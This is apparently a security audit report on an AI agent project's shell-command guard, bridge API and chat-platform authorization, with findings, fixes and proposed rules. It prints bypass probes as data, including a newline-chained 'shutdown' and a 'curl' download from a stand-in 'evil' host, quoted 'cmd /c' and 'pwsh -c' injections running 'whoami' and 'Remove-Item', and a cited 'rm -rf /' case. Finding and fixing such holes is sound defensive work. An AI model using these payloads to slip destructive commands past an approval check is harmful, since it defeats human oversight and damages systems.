## Findings

### G4-F1 — CRITICAL — CommandGuard newline bypass: second command after `\n` is never classified (CONFIRMED allow)
- Files: `security/command_guard.py:151-214` (`split_compound_command`), `:217-346` (`_classify_single`)
- Probe results (actual output from this repo):
  - `"echo hello\nshutdown /r"` → **allow**, root=`echo`, reasons=[]
  - `"echo hi\ncurl http://evil/x -o /tmp/x"` → **allow**
- Root cause: `split_compound_command` splits only on `&& || ; | &` (line 199) — **not on `\n`/`\r`**. A newline-chained command collapses into ONE segment whose ROOT is the first binary; the ASK_BINARIES gate (line 315) checks the *root* only, so `shutdown`, `rm`, anything after the first newline is invisible. Note the irony: `is_known_safe` line 104 DOES reject `\n` for the fast path, but that only suppresses known_safe — with no other ask/deny reason triggered the final verdict is still ALLOW.
- This is an established CVE-class bug in sibling projects:
  - rtk lexer doesn't split on newlines → auto-allows trailing `rm -rf /`: https://github.com/rtk-ai/rtk/issues/2262
  - ironclaw approval bypass via newline-chained destructive commands (`sh -c` executes both lines): https://github.com/nearai/ironclaw/issues/4861
  - qwen-code fix PR splitting on `\n` and `\r\n`: https://github.com/QwenLM/qwen-code/pull/1638
  - openclaw advisory (newline + line-continuation variants): https://github.com/openclaw/openclaw/security/advisories/GHSA-9868-vxmx-w862
- Fix: treat `\n`/`\r` as separators in `split_compound_command` AND add a blanket rule in `_classify_single`: if raw command contains `\n`/`\r` outside quotes → at minimum ASK (fail-closed).

### G4-F2 — CRITICAL — Quoted compound operators are invisible to both operator scanners; `known_safe=True` launders them (CONFIRMED allow)
- Files: `security/command_guard.py:97` (`is_known_safe` quote-strip), `security/stripper.py:41` (`strip()` quote-strip)
- Probe results:
  - `'cmd /c "type x & whoami"'` → **allow, known_safe=True**
  - `'pwsh -c "Get-Process & start calc"'` → **allow, known_safe=True**
  - `'pwsh -c "Get-Process; Remove-Item -Force C:\pagefile.sys"'` → **allow, known_safe=True**
- Root cause chain: BOTH `is_known_safe` (line 97) and `CommandStripper.strip` (stripper.py:41) strip quoted substrings before scanning for operators (`;|&` etc.), so operators inside quotes are never seen as "Operators". The cmd/powershell fast-paths (command_guard.py:124-135) then match the benign read-only cmdlet (`type`, `Get-Process`) inside the same quoted string → `known_safe=True` → skips the ASK_BINARIES prompt for `cmd`/`pwsh` themselves AND skips the Operators ask. The executor hands the string to the real shell, which happily runs `& whoami` / `Remove-Item`.
- The quote-strip was added to avoid false positives on semicolons in commit messages — but it created a total blind spot for quoted injection into `-c` style interpreters.
- Fix: when root is an interpreter/shell (`cmd`, `powershell`, `pwsh`, `bash`, ...) do NOT strip quotes before operator detection; or refuse `known_safe` whenever the raw (unstripped) command contains any operator character.

### G4-F3 — HIGH — Bridge API server binds 0.0.0.0 with default token and ~10 unauthenticated routes
- Files: `api/bridge.py:2698` (`uvicorn.run(app, host="0.0.0.0", port=8000)`), `:99` (`API_TOKEN = os.getenv("AJA_API_TOKEN", "dev-token-123")`)
- Unauthenticated routes (no `verify_token` dependency): `/diff` (git diff of the repo — source disclosure), `/git/history`, `/runtime/approvals`, `/runtime/events`, `/runtime/batons`, `/runtime/stream`, `/safety/pending`, `/safety/history`, GET `/config` (masked key but leaks provider/model config), GET `/status`, and **`/ws/mobile` websocket which has zero auth** (bridge.py:210-224) streaming system state + all bus events to any peer.
- Combined with `host="0.0.0.0"`, anyone on the network can read repo diffs, runtime events, pending approvals (which contain full commands), and ride the websocket. Default token `dev-token-123` protects nothing when unset.
- Mitigation already exists elsewhere in the repo (docker-compose.vps.yml publishes no ports) — but the direct `python -m ...bridge` entrypoint is wide open. Fix: bind loopback by default (`AJA_BIND_HOST` opt-out), require explicit `AJA_API_TOKEN` (refuse to start with default on non-loopback bind), add `verify_token` to the remaining routes.

### G4-F4 — HIGH — Telegram webhook secret comparison not constant-time; secret optional ⇒ forgeable updates
- File: `api/bridge.py:1254-1256` (`ensure_telegram_secret`), `:105`, `:2247-2252`
- Two issues:
  1. `if TELEGRAM_WEBHOOK_SECRET and secret_header != TELEGRAM_WEBHOOK_SECRET` — plain string compare (timing side channel) AND **fail-open when env unset**: with `TELEGRAM_WEBHOOK_SECRET=""` anyone who can reach the port can POST forged Telegram updates. The per-update allowlist check (line 2273) is the only remaining guard, and it uses the module-import-time single-ID env (see F5).
  2. Comparison should use `hmac.compare_digest` (Telegram docs define the `secret_token`/`X-Telegram-Bot-Api-Secret-Token` mechanism: https://core.telegram.org/bots/api#setwebhook ; grammY implements it with an explicitly constant-time comparator: https://github.com/grammyjs/grammY/blob/main/src/convenience/webhook.ts ).
- Also note webhook path shares fate with F1/F2: an authorized operator message can carry a mission goal containing newline-chained shell text.

### G4-F5 — MEDIUM — Three divergent TELEGRAM allowlist implementations; bridge/webhook ones are import-time-frozen, comma-blind, and semantically inconsistent
- Files:
  - `gateway/auth.py:74-101` — canonical, correct: dynamic env read, comma+whitespace tolerant (`{"123, 456"}` parses fine), blank=None handled, `*`=allow-all, deny-with-token/no-allowlist fail-safe. **This one is good.**
  - `api/bridge.py:104, 2233, 2273` — webhook + `/telegram/command` read `os.getenv(...)` ONCE at module import (restart required for .env changes; ignores `aja.config` fallback used everywhere else) and compare `str(user_id) != str(TELEGRAM_ALLOWED_USER_ID)` — a configured comma list (`TELEGRAM_ALLOWED_USER_ID=123,456`) NEVER matches → operator locks themselves out (fail-closed availability bug); literal `"*"` also matches nobody (inconsistent with auth.py where `*`=allow-all).
  - `gateway/tg_client.py:523-532` — callback auth re-implements its own check: denies when allowlist is `"*"` (again inconsistent with auth.py semantics), breaks on comma lists, and does NOT call `is_user_authorized` despite the comment claiming "same config-fallback resolution".
  - Same single-compare pattern in `scheduler/telegram.py:15`; `notifier.py:11` reuses the allowlist var as a chat_id (conflates two different IDs).
- Net: three code paths can disagree about who is authorized depending on env shape (`*`, commas, whitespace) and process start time. Fix: route ALL sites through `is_user_authorized("telegram", ...)`.

### G4-F6 — MEDIUM — `redact_secrets` misses Telegram/Discord/Slack token shapes; token-bearing URLs constructed & logged
- File: `utils/redact.py:13-23`
- Covered well: `sk-…`, Bearer, `key=/token=/secret=/password=/authorization=` assignments, `[?&]key=` query params, `gh[pousr]_…`. Missing:
  - **Telegram bot tokens** (`\d{8,10}:[A-Za-z0-9_-]{35}`) — and bridge.py builds them INTO URLs (`https://api.telegram.org/bot{TOKEN}/sendMessage`, bridge.py:1232); telegram_envelope logs raw send errors (`logger.error("Telegram send failed: %s", e)`, telegram_envelope.py:358) where httpx exceptions embed the full request URL → bot token in logs. Token-in-URL is itself flagged as risky practice (any proxy/log captures it): https://github.com/aws-samples/sample-agentcore-demo-platform/blob/main/super-agent/backend/src/services/telegram-adapter.ts uses POST-body auth instead.
  - Slack tokens (`xox[bapr]-…`) and Discord bot tokens — adapters hold these in `self.token`; any exception dump of adapter state leaks them.
  - AWS `AKIA…` keys.
- Call-site gaps: `send_telegram_message` returns unredacted `str(exc)` into chat history (bridge.py:1251); slack_adapter denial path logs unauthorized users' raw message text (slack_adapter.py:72-76 — privacy, not secret).

### G4-F7 — LOW — tg_client callback "*" deny is fail-closed but wrong; approvals have no cross-user binding
- `gateway/approvals.py::resolve_approval` binds only on mission existence/status/expiry — ANY authorized user on ANY platform can approve/reject any mission (no check that the approver's chat/platform matches where the approval was requested). Fine for single-operator deployments (current reality), latent multi-user hazard. Document or bind.

### G4-F8 — LOW — Slack adapter has no interaction surface, Discord envelope OK; empty-allowlist semantics verified sound
- Verified NON-findings (for the record): `auth.py` empty-string allowlist correctly treated as unset (`get_allowlist` strips + truthiness, auth.py:57); no-token platforms allow (documented local-only posture); discord_adapter.py:292 and discord_envelope.py:201 both authorize callbacks through the unified function; telegram_envelope.py:263/319 authorizes messages AND callbacks. Slack adapter authorizes messages (slack_adapter.py:70) and defines no interactive callbacks (nothing to bypass). Per-platform signing verification (Slack `X-Slack-Signature` v0 HMAC w/ 5-min timestamp window: https://docs.slack.dev/authentication/verifying-requests-from-slack ; Discord Ed25519 over `{timestamp}{body}`: https://webhooks.cc/docs/guides/verify-webhook-signatures ) is NOT needed today because both use socket/WebSocket outbound connections — only relevant if HTTP event endpoints get added.

## Proposed claims

1. C1: Any command classifier that splits on a subset of shell separators MUST treat bare `\n`/`\r` as separators (and ideally fail closed on any parse ambiguity) — otherwise the last line launders everything after the first benign verb. (G4-F1, empirically confirmed)
2. C2: Quote-stripping before operator detection is only safe when the root cannot interpret the quoted content as code; for `-c`/`/c` interpreter roots, scan the RAW string. (G4-F2, empirically confirmed)
3. C3: One platform = one authorization function. Every hand-rolled allowlist comparison drifts within months (here: three divergent copies). (G4-F5)
4. C4: Webhook secrets must be constant-time compared AND required (fail-closed) whenever the endpoint is remotely reachable. (G4-F4)
5. C5: `redact_secrets` should cover the token formats the product actually issues/holds (Telegram/Discord/Slack), and URLs should not embed bearer credentials in the first place. (G4-F6)
